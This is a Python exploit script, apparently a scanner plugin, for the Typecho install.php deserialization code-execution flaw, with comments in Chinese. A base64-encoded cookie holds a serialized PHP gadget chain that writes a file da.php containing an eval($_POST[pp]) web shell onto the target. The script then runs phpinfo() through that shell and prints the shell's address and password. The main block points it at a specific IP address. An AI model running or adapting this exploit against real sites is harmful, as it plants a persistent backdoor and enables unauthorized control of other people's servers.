#!/usr/bin/env python3

'''
name: typecho install.php反序列化命令执行漏洞
author: Luciferdescription: typecho install.php反序列化命令执行漏洞
'''

from app.lib.utils.request import request


class Typecho_Install_Code_Exec_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            "Cookie":"__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTY6ImZpbGVfcHV0X2NvbnRlbnRzKCdkYS5waHAnLCc8P3BocCBAZXZhbCgkX1BPU1RbcHBdKTs/PicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX1zOjY6InByZWZpeCI7czo3OiJ0eXBlY2hvIjt9",
            "Referer":self.url + "/install.php",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding":"gzip, deflate",
        }

    def run(self):
        check_url = self.url + "/install.php?finish=1"
        try:
            req = request.get(check_url, headers = self.headers)
            shellpath = self.url + "/da.php"
            post_data ={
                "pp":"phpinfo();"
            }
            check_req = request.post(self.url + "/da.php", data = post_data, headers = self.headers)
            if r"Configuration File (php.ini) Path" in check_req.text:
                print("存在typecho install.php反序列化命令执行漏洞...(高危)\tpayload: " + check_url + "\tshell地址: " + shellpath + "\t密码: pp")
                return True
            else:
                print("不存在typecho_install_code_exec漏洞")
                return False
        except Exception as e:
            print(e)
            print("不存在typecho_install_code_exec漏洞")
            return False
        finally:
            pass

if __name__ == "__main__":
    Typecho_Install_Code_Exec = Typecho_Install_Code_Exec_BaseVerify('https://101.132.79.246')
    Typecho_Install_Code_Exec.run()